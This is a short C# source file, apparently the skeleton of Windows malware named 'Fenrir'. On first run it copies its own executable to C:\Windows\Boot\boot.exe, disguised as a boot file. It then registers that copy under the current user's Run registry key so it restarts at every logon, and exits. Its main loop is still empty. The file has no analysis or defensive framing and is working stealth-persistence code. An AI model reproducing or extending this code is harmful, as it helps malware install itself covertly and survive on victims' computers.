using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using Timer = System.Timers.Timer;

namespace Fenrir
{
    class kit
    {

        private string currPath = Directory.GetCurrentDirectory();
        private Form1 frm;
        private Timer tmr = new Timer();
    

        public kit(Form1 form)
        {
            this.frm = form;
            if(currPath.ToString() != @"C:\Windows\Boot\")
                fixFirstStart();
            else
            {
                runKitCycle();
            }
        }
    
        private void fixFirstStart()
        {
            SetAutorunValue(true);
            copyExe();
            Application.Exit();
        }

        private void runKitCycle()
        {
            
        }


/////////////////////////////////////////////////////////////////////////////////
       
        private void copyExe()
        {
            File.Copy(System.Windows.Forms.Application.ExecutablePath,@"C:\Windows\Boot\boot.exe");
        }


        private bool SetAutorunValue(bool autorun)
        {
            string ExePath = @"C:\Windows\Boot\boot.exe";
            string name = "boot";
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                if (autorun)
                    reg.SetValue(name, ExePath);
                else
                    reg.DeleteValue(name);

                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }
         
    }
}
